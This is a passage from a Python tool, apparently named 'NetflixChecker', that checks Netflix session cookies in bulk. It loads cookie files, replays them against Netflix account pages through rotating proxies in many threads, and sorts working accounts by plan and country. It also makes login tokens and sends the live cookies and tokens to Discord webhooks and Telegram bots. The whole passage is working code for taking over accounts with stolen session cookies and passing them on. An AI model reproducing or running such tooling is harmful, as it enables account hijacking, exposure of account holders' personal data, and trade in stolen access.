                    ),
                    output_filename,
                    raw_cookie_content,
                )
        elif webhook_mode == "nftoken":
            if is_subscribed and usable_nftoken:
                send_discord_webhook(
                    webhook_cfg.get("url", ""),
                    build_discord_nftoken_message(
                        info,
                        nftoken_data,
                        nftoken_mode,
                        use_emojis=notification_emojis_enabled,
                    ),
                )
        else:
            if is_plan_allowed_for_notifications(webhook_cfg, plan_key):
                send_discord_webhook(
                    webhook_cfg.get("url", ""),
                    build_discord_full_message(
                        config,
                        info,
                        is_subscribed,
                        output_filename,
                        nftoken_data,
                        use_emojis=notification_emojis_enabled,
                    ),
                    output_filename,
                    formatted_cookie,
                )

    if telegram_cfg.get("enabled", False):
        if telegram_mode == "cookie":
            if is_plan_allowed_for_notifications(telegram_cfg, plan_key):
                send_telegram(
                    telegram_cfg.get("bot_token", ""),
                    telegram_cfg.get("chat_id", ""),
                    build_telegram_full_message(
                        config,
                        info,
                        is_subscribed,
                        output_filename,
                        None,
                        use_emojis=notification_emojis_enabled,
                    ),
                    output_filename,
                    raw_cookie_content,
                )
        elif telegram_mode == "nftoken":
            if is_subscribed and usable_nftoken:
                send_telegram(
                    telegram_cfg.get("bot_token", ""),
                    telegram_cfg.get("chat_id", ""),
                    build_telegram_nftoken_message(
                        info,
                        nftoken_data,
                        nftoken_mode,
                        use_emojis=notification_emojis_enabled,
                    ),
                )
        else:
            if is_plan_allowed_for_notifications(telegram_cfg, plan_key):
                send_telegram(
                    telegram_cfg.get("bot_token", ""),
                    telegram_cfg.get("chat_id", ""),
                    build_telegram_full_message(
                        config,
                        info,
                        is_subscribed,
                        output_filename,
                        nftoken_data,
                        use_emojis=notification_emojis_enabled,
                    ),
                    output_filename,
                    formatted_cookie,
                )


def get_account_page(session, proxy=None, request_timeout=15, fallback_account_page=False):
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/124.0.0.0 Safari/537.36"
        ),
        "Accept-Encoding": "identity",
    }

    membership_url = "https://www.netflix.com/account/membership"
    response = session.get(membership_url, headers=headers, proxies=proxy, timeout=request_timeout)
    if response.status_code == 200 and response.text:
        primary_info = extract_info(response.text)
        if not fallback_account_page or has_complete_account_info(primary_info):
            return response.text, response.status_code, primary_info

        fallback_info = None
        try:
            fallback_response = session.get(
                "https://www.netflix.com/YourAccount",
                headers=headers,
                proxies=proxy,
                timeout=request_timeout,
            )
            if fallback_response.status_code == 200 and fallback_response.text:
                fallback_info = extract_info(fallback_response.text)
        except Exception:
            fallback_info = None
        return response.text, response.status_code, merge_info(primary_info, fallback_info)

    return response.text, response.status_code, None


def print_status_message(status, cookie_file, country=None, plan=None, reason=None):
    color_codes = {
        "success": "\033[33m",
        "free": "\033[34m",
        "duplicate": "\033[35m",
        "failed": "\033[31m",
        "error": "\033[31m",
    }
    reset_code = "\033[0m"
    base_path = f"cookies\\{cookie_file}"
    details = []
    if country:
        details.append(f"Country: {country}")
    if plan:
        details.append(f"Plan: {plan}")
    detail_text = f" [{' | '.join(details)}]" if details else ""

    if status == "success":
        print(f"> {color_codes[status]}Login successful with {base_path}{detail_text}. Moved to output folder!{reset_code}")
    elif status == "free":
        print(f"> {color_codes[status]}Login successful with {base_path}{detail_text}. But no active subscription. Moved to output\\Free folder!{reset_code}")
    elif status == "failed":
        reason_text = f" Reason: {reason}." if reason else ""
        print(f"> {color_codes[status]}Login failed with {base_path}.{reason_text} Moved to failed folder!{reset_code}")
    elif status == "duplicate":
        print(f"> {color_codes[status]}Duplicate email found with {base_path}. Moved to output\\Duplicate folder!{reset_code}")
    elif status == "error":
        reason_text = f" Reason: {reason}." if reason else ""
        print(f"> {color_codes[status]}Error occurred with {base_path}.{reason_text} Moved to broken folder!{reset_code}")


def check_cookies(num_threads=30, config=None):
    # origin trace: harshitkamboj :: site+github+discord
    if config is None:
        config = copy.deepcopy(DEFAULT_CONFIG)
    create_base_folders()

    counts = {"hits": 0, "free": 0, "bad": 0, "duplicate": 0, "on_hold": 0, "errors": 0}
    plan_counts = {}
    plan_labels = {}
    run_folder = get_run_folder()
    stop_requested = threading.Event()

    display_mode = str(config.get("display", {}).get("mode", "log")).lower()
    if display_mode not in ("log", "simple"):
        display_mode = "log"

    proxies = load_proxies()
    retries_cfg = config.get("retries", {})
    performance_cfg = config.get("performance", {})
    max_retry_attempts = retries_cfg.get("error_proxy_attempts", 5)
    nftoken_retry_attempts = retries_cfg.get("nftoken_attempts", 5)
    request_timeout_seconds = performance_cfg.get("request_timeout_seconds", 15)
    fallback_account_page = bool(performance_cfg.get("fallback_account_page", False))
    retry_incomplete_info = bool(performance_cfg.get("retry_incomplete_info", False))
    nftoken_for_free = bool(performance_cfg.get("nftoken_for_free", False))
    try:
        max_retry_attempts = max(1, int(max_retry_attempts))
    except Exception:
        max_retry_attempts = 3
    try:
        nftoken_retry_attempts = max(1, int(nftoken_retry_attempts))
    except Exception:
        nftoken_retry_attempts = 1
    try:
        request_timeout_seconds = max(5, int(request_timeout_seconds))
    except Exception:
        request_timeout_seconds = 15

    retryable_status_codes = {403, 429, 500, 502, 503, 504}

    cookie_files = os.listdir(cookies_folder) if os.path.exists(cookies_folder) else []
    cookie_files = [f for f in cookie_files if f.lower().endswith((".txt", ".json"))]
    cookie_tasks = []
    source_bundle_states = {}

    for cookie_file in cookie_files:
        cookie_path = os.path.join(cookies_folder, cookie_file)
        try:
            with open(cookie_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception:
            cookie_tasks.append(
                {
                    "kind": "read_error",
                    "cookie_file": cookie_file,
                    "cookie_path": cookie_path,
                }
            )
            continue

        bundles = extract_netflix_cookie_bundles(content)
        if not bundles:
            cookie_tasks.append(
                {
                    "kind": "missing_cookies",
                    "cookie_file": cookie_file,
                    "cookie_path": cookie_path,
                }
            )
            continue

        bundle_total = len(bundles)
        rewrite_source = cookie_file.lower().endswith(".txt") and bundle_total > 1
        if bundle_total > 1:
            source_bundle_states[cookie_path] = {
                "lock": threading.Lock(),
                "remaining_indices": {bundle.get("index", 1) for bundle in bundles},
                "bundles": {bundle.get("index", 1): bundle for bundle in bundles},
                "rewrite_source": rewrite_source,
            }

        for bundle in bundles:
            bundle_index = bundle.get("index", 1)
            cookie_tasks.append(
                {
                    "kind": "bundle",
                    "cookie_file": cookie_file,
                    "cookie_path": cookie_path,
                    "bundle": bundle,
                    "bundle_index": bundle_index,
                    "bundle_total": bundle_total,
                    "bundle_file": build_bundle_filename(cookie_file, bundle_index, bundle_total),
                    "bundle_label": build_bundle_display_name(cookie_file, bundle_index, bundle_total),
                    "remove_source_during_result": bundle_total <= 1,
                }
            )

    cookies_total = len(cookie_tasks)
    cookies_left = [cookies_total]
    task_queue = queue.Queue()
    for cookie_task in cookie_tasks:
        task_queue.put(cookie_task)

    if display_mode == "log":
        print(f"Total cookies: {cookies_total}")
        print(f"Total proxies: {len(proxies)}")
        print(f"Number of threads: {num_threads}")
        print("\nStarting cookie checking...\n")
    else:
        render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)

    header_lock = threading.Lock()

    def update_title():
        valid = counts["hits"] + counts["free"]
        set_console_title(
            f"CookiesLeft {cookies_left[0]}/{cookies_total} Valid {valid} "
            f"Failed {counts['bad']} Duplicate {counts['duplicate']} OnHold {counts['on_hold']} Errors {counts['errors']}"
        )

    def get_next_proxy(used_proxy_indices):
        if not proxies:
            return None, None
        available = [idx for idx in range(len(proxies)) if idx not in used_proxy_indices]
        if not available:
            available = list(range(len(proxies)))
        chosen_index = random.choice(available)
        return proxies[chosen_index], chosen_index

    def handle_result(info, netscape_content, cookie_path, cookie_file, is_subscribed, cookie_dict, remove_source=True):
        create_base_folders()
        user_guid = info.get("userGuid") if info.get("userGuid") and info.get("userGuid") != "null" else generate_unknown_guid()
        plan_key, plan_folder_label, plan_name = derive_output_plan_bucket(info, is_subscribed)
        account_on_hold = is_subscribed and is_on_hold_account(info)
        info["userGuid"] = user_guid
        country = info.get("countryOfSignup") or "Unknown"
        random_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))
        if is_subscribed:
            max_streams = (info.get("maxStreams") or "Unknown").rstrip("}")
            filename = f"{max_streams}_{country}_github-harshitkamboj_{info.get('showExtraMemberSection')}_{user_guid}_{random_suffix}.txt"
        else:
            has_payment_method = "True" if decode_netflix_value(info.get("paymentMethodType")) not in {None, "", "UNKNOWN", "Unknown", "N/A"} else "False"
            filename = f"PaymentM-{has_payment_method}_{country}_github-harshitkamboj_{user_guid}_{random_suffix}.txt"
        email_value = (decode_netflix_value(info.get("email")) or "").strip().lower()
        duplicate_key = email_value or user_guid

        with guid_lock:
            if duplicate_key in processed_emails:
                nftoken_data = None
                if is_subscribed and get_nftoken_mode(config) != "false":
                    nftoken_data, _ = create_nftoken(cookie_dict, nftoken_retry_attempts)
                formatted_cookie = format_cookie_file(info, netscape_content, config, is_subscribed, nftoken_data)
                duplicate_dir = create_output_folder_when_needed(output_folder, get_canonical_output_label("duplicate"), run_folder)
                duplicate_name = f"DUPLICATE_{filename}"
                duplicate_target = os.path.join(duplicate_dir, duplicate_name)
                write_text_file_safely(duplicate_target, formatted_cookie)
                if remove_source and os.path.exists(cookie_path):
                    os.remove(cookie_path)
                return "duplicate", None, None, False
            processed_emails.add(duplicate_key)

        if is_subscribed:
            if account_on_hold:
                output_dir = create_output_folder_when_needed(
                    output_folder,
                    plan_folder_label,
                    run_folder,
                    category="On Hold",
                )
            else:
                output_dir = create_output_folder_when_needed(output_folder, plan_folder_label, run_folder)
            result_type = "success"
        else:
            output_dir = create_output_folder_when_needed(output_folder, get_canonical_output_label("free"), run_folder)
            result_type = "free"

        nftoken_data = None
        should_generate_nftoken = get_nftoken_mode(config) != "false" and (is_subscribed or nftoken_for_free)
        if should_generate_nftoken:
            nftoken_data, _ = create_nftoken(cookie_dict, nftoken_retry_attempts)
        formatted_cookie = format_cookie_file(info, netscape_content, config, is_subscribed, nftoken_data)
        output_path = os.path.join(output_dir, filename)
        write_text_file_safely(output_path, formatted_cookie)

        if remove_source and os.path.exists(cookie_path):
            os.remove(cookie_path)

        send_notifications(config, info, is_subscribed, filename, formatted_cookie, netscape_content, nftoken_data)
        return result_type, plan_key, plan_name, account_on_hold

    def record_result(result_type, cookie_label, plan_key=None, plan_name=None, result_reason=None, result_country=None, result_on_hold=False):
        with header_lock:
            if result_type == "success":
                counts["hits"] += 1
                if result_on_hold:
                    counts["on_hold"] += 1
                if plan_key:
                    plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                    if plan_name:
                        plan_labels[plan_key] = plan_name
            elif result_type == "free":
                counts["free"] += 1
                if plan_key:
                    plan_counts[plan_key] = plan_counts.get(plan_key, 0) + 1
                    if plan_name:
                        plan_labels[plan_key] = plan_name
            elif result_type == "failed":
                counts["bad"] += 1
            elif result_type == "duplicate":
                counts["duplicate"] += 1
            else:
                counts["errors"] += 1

            cookies_left[0] -= 1
            update_title()

            if display_mode == "log":
                print_status_message(
                    result_type if result_type in {"success", "free", "failed", "duplicate", "error"} else "error",
                    cookie_label,
                    result_country,
                    plan_name,
                    result_reason,
                )
            else:
                render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)

    def finalize_bundle_source(task):
        cookie_path = task.get("cookie_path")
        state = source_bundle_states.get(cookie_path)
        if not state:
            return

        with state["lock"]:
            remaining_indices = state["remaining_indices"]
            remaining_indices.discard(task.get("bundle_index", 1))

            if remaining_indices:
                if not state.get("rewrite_source"):
                    return

                remaining_texts = []
                for remaining_index in sorted(remaining_indices):
                    bundle = state["bundles"].get(remaining_index) or {}
                    netscape_text = bundle.get("netscape_text", "").strip()
                    if netscape_text:
                        remaining_texts.append(netscape_text)

                if not remaining_texts:
                    try:
                        if os.path.exists(cookie_path):
                            os.remove(cookie_path)
                    except Exception:
                        pass
                    return

                try:
                    write_text_file_safely(cookie_path, "\n\n".join(remaining_texts) + "\n")
                except Exception:
                    pass
                return

            try:
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            except Exception:
                pass
            source_bundle_states.pop(cookie_path, None)

    def process_task(task):
        task_kind = task.get("kind")
        cookie_file = task.get("cookie_file")
        cookie_path = task.get("cookie_path")

        if task_kind == "read_error":
            result_reason = "file read error"
            try:
                move_cookie_with_reason(cookie_path, broken_folder, cookie_file, result_reason)
            except Exception:
                pass
            record_result("error", cookie_file, result_reason=result_reason)
            return

        if task_kind == "missing_cookies":
            result_reason = "missing required cookies"
            try:
                move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)
            except Exception:
                pass
            record_result("failed", cookie_file, result_reason=result_reason)
            return

        bundle = task.get("bundle") or {}
        netscape_content = bundle.get("netscape_text", "")
        bundle_file = task.get("bundle_file") or cookie_file
        bundle_label = task.get("bundle_label") or cookie_file
        remove_source_during_result = task.get("remove_source_during_result", True)

        plan_key = None
        plan_name = None
        result_type = None
        result_reason = None
        result_country = None
        result_on_hold = False

        try:
            cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_content)
            if not cookies or not has_required_netflix_cookies(cookies):
                result_type = "failed"
                result_reason = "missing required cookies"
                if remove_source_during_result:
                    move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)
                else:
                    write_cookie_with_reason(failed_folder, bundle_file, result_reason, netscape_content)
                return

            session = requests.Session()
            session.cookies.update(cookies)

            used_proxy_indices = set()
            response_text = None
            status_code = None
            extracted_info = None
            last_exception = None

            for attempt in range(max_retry_attempts):
                proxy, proxy_index = get_next_proxy(used_proxy_indices)
                if proxy_index is not None:
                    used_proxy_indices.add(proxy_index)

                try:
                    response_text, status_code, extracted_info = get_account_page(
                        session,
                        proxy,
                        request_timeout=request_timeout_seconds,
                        fallback_account_page=fallback_account_page,
                    )
                    if status_code == 200 and response_text:
                        if retry_incomplete_info and attempt < max_retry_attempts - 1:
                            if not (extracted_info and has_complete_account_info(extracted_info)):
                                continue
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception as req_error:
                    last_exception = req_error
                    if attempt < max_retry_attempts - 1:
                        continue

            if status_code == 200 and response_text:
                info = extracted_info or extract_info(response_text)
                if info.get("countryOfSignup") and info.get("countryOfSignup") != "null":
                    is_subscribed = is_subscribed_account(info)
                    result_country = info.get("countryOfSignup")
                    result_type, plan_key, plan_name, result_on_hold = handle_result(
                        info,
                        netscape_content,
                        cookie_path,
                        bundle_file,
                        is_subscribed,
                        cookies,
                        remove_source=remove_source_during_result,
                    )
                else:
                    result_type = "failed"
                    result_reason = "incomplete account page"
                    if remove_source_during_result:
                        move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)
                    else:
                        write_cookie_with_reason(failed_folder, bundle_file, result_reason, netscape_content)
            elif last_exception is not None or status_code in retryable_status_codes:
                result_type = "error"
                if status_code in retryable_status_codes:
                    result_reason = describe_http_error(status_code)
                elif isinstance(last_exception, requests.exceptions.Timeout):
                    result_reason = "timeout"
                elif isinstance(last_exception, requests.exceptions.ProxyError):
                    result_reason = "proxy error"
                else:
                    result_reason = "proxy error"
                if remove_source_during_result:
                    move_cookie_with_reason(cookie_path, broken_folder, cookie_file, result_reason)
                else:
                    write_cookie_with_reason(broken_folder, bundle_file, result_reason, netscape_content)
            else:
                result_type = "failed"
                result_reason = "incomplete account page"
                if remove_source_during_result:
                    move_cookie_with_reason(cookie_path, failed_folder, cookie_file, result_reason)
                else:
                    write_cookie_with_reason(failed_folder, bundle_file, result_reason, netscape_content)
        except Exception:
            result_type = "error"
            result_reason = result_reason or "proxy error"
            try:
                if remove_source_during_result:
                    move_cookie_with_reason(cookie_path, broken_folder, cookie_file, result_reason)
                else:
                    write_cookie_with_reason(broken_folder, bundle_file, result_reason, netscape_content)
            except Exception:
                pass
        finally:
            record_result(
                result_type or "error",
                bundle_label,
                plan_key=plan_key,
                plan_name=plan_name,
                result_reason=result_reason,
                result_country=result_country,
                result_on_hold=result_on_hold,
            )
            if not remove_source_during_result:
                finalize_bundle_source(task)

    update_title()

    def worker():
        while not stop_requested.is_set():
            try:
                task = task_queue.get_nowait()
            except queue.Empty:
                break
            process_task(task)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, daemon=True)
        threads.append(t)

    try:
        for t in threads:
            t.start()
        while any(t.is_alive() for t in threads):
            for t in threads:
                t.join(timeout=0.2)
    except KeyboardInterrupt:
        stop_requested.set()
        if display_mode == "simple":
            print(color_text("\nStopping... please wait.", "\033[93m", True))
        else:
            print("\nStopping... please wait.")
        for t in threads:
            t.join(timeout=1)
        set_console_title("NetflixChecker - Stopped")
        return

    valid = counts["hits"] + counts["free"]
    set_console_title(
        f"NetflixChecker - Finished Valid {valid} Failed {counts['bad']} "
        f"Duplicate {counts['duplicate']} OnHold {counts['on_hold']} Errors {counts['errors']}"
    )

    if display_mode == "simple":
        render_simple_dashboard(counts, plan_counts, plan_labels, cookies_left[0], cookies_total, True)
        print(color_text("\nFinished Checking", "\033[92m", True))
    else:
        label_code = "\033[94m"
        value_code = "\033[93m"
        good_code = "\033[92m"
        free_code = "\033[95m"
        bad_code = "\033[91m"
        line = "==================== Final Summary ===================="
        print(color_text("\n\n" + line, "\033[95m", True))
        print(color_text("Checked   :", label_code, True), color_text(str(cookies_total), value_code, True))
        print(color_text("Good      :", label_code, True), color_text(str(counts["hits"]), good_code, True))
        print(color_text("Free      :", label_code, True), color_text(str(counts["free"]), free_code, True))
        print(color_text("Bad       :", label_code, True), color_text(str(counts["bad"]), bad_code, True))
        print(color_text("Duplicate :", label_code, True), color_text(str(counts["duplicate"]), value_code, True))
        print(color_text("OnHold    :", label_code, True), color_text(str(counts["on_hold"]), value_code, True))
        print(color_text("Errors    :", label_code, True), color_text(str(counts["errors"]), bad_code, True))
        print(color_text(line, "\033[95m", True))


def main():
    # handle-hint: illuminatis69
    create_base_folders()
    cleanup_stale_temp_files()
    config, config_source = load_config()

    clear_screen()
    print(BANNER)
    check_for_updates()
    print("--------------------------------------------------------------------------------------------------")
    print("")
    print("            👉  Welcome, after moving your cookies to (cookies) folder, press  👈")
    print("                              Enter if you're ready to start!")
    input()

    initial_files = [
        f for f in os.listdir(cookies_folder)
        if not f.startswith(".") and f.lower().endswith((".txt", ".json"))
    ]
    if not initial_files:
        print("No cookies found in cookies folder. Add .txt/.json cookies and run again.")
        return

    try:
        num_threads_input = input("Enter number of threads (default 30): ")
        num_threads = int(num_threads_input) if num_threads_input.strip() else 30
        if num_threads < 1 or num_threads > 300:
            raise ValueError
    except ValueError:
        print("Invalid input, using 30 threads as default")
        num_threads = 30

    check_cookies(num_threads, config)
    input("Press enter to exit\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped by user.")
